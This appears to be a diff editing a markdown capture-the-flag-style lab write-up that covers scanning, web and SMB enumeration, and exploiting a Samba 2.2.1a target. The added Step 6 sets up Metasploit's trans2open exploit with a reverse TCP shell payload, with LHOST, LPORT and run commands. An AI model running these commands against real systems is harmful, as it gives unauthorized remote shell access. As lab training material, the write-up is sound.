@@ -34,7 +34,7 @@ nmap -T4 -p- -A 192.168.1.193
 
 The scan revealed open ports including HTTP and SMB services.
 
-🌐 **Step 3: Web Enumeration**
+## 🌐 **Step 3: Web Enumeration**
 Since port 80 was open, I navigated to the web server and began enumerating.
 
 Nikto Web Scanner
@@ -51,55 +51,73 @@ I then ran DirBuster to brute-force hidden directories and file extensions:
 
 dirbuster &
 I added extensions like .pdf, .zip, and .rar to catch more files. While DirBuster ran, I manually reviewed the page source and found a 404 page that disclosed the Apache version — a small but useful info leak.
+![image](https://github.com/user-attachments/assets/09bdaab1-3935-4951-b556-ef7d3b00fffe)
 
-🔧 Step 4: SMB Enumeration
+
+
+## 🔧 Step 4: SMB Enumeration
 Back to the Nmap scan — I noticed SMB was running and decided to investigate further.
 
 Using Metasploit to Identify SMB Version
 I launched Metasploit and searched for SMB-related modules:
 
-bash
-Copy
-Edit
 search smb
 Then I used the SMB version scanner module:
 
-bash
-Copy
-Edit
+
 use auxiliary/scanner/smb/smb_version
-set RHOSTS 192.168.1.193
+set RHOSTS 192.168.x.xxx
+
 run
 This revealed that the target was running Samba 2.2.1a, which is vulnerable.
 
 Connecting with SMBClient
 I attempted to connect to the file share using:
+![image](https://github.com/user-attachments/assets/12a1ab35-a8c0-46bb-8113-6d8996ea8575)
 
-bash
-Copy
-Edit
-smbclient //192.168.1.193/IPC$ -N
+
+smbclient //192.168.x.xxx/IPC$ -N
 Anonymous login worked for IPC$, though I couldn’t access admin$.
 
 📚 Step 5: Finding Exploits
 With the Samba version identified, I searched Exploit-DB and found a known vulnerability that matched. I also found a Metasploit module on Rapid7’s site that could be used to exploit Samba 2.2.1a.
 
+## 🚪 Step 6: Exploiting Samba with a Reverse Shell
+
+After identifying that the target was running **Samba 2.2.x**, I searched for relevant Metasploit modules. I found the `trans2open` exploit and configured it with a **non-staged reverse TCP shell payload** (`linux/x86/shell_reverse_tcp`), which is simple and direct.
+
+### Payload Settings:
+- **LHOST**: `192.168.xx.xxx`
+- **LPORT**: `4444`
+- **CMD**: `/bin/sh`
+
+Here’s what the payload configuration looked like:
+
+
+set payload linux/x86/shell_reverse_tcp
+set LHOST 192.168.57.139
+set LPORT 4444
+run
+
+![image](https://github.com/user-attachments/assets/6f2ccb85-89e4-4f71-a18a-4e6ce24cec97)
+
+
 I read through the exploit details and prepped the payload in Metasploit for potential use.
 
 🛠 Tools I Used
-netdiscover
+-netdiscover
 
-nmap
+-nmap
 
-nikto
+-nikto
 
-dirbuster
+-dirbuster
 
-burpsuite
+-burpsuite
 
-metasploit
+-metasploit
 
-smbclient
+-smbclient
 
 🎯 Conclusion
 This machine helped me understand:
@@ -114,6 +132,3 @@ SMB service enumeration and exploitation research
 
 It was a great introduction to real-world penetration testing, and it showed me how powerful a combination of tools and research can be.
 
-yaml
-Copy
-Edit
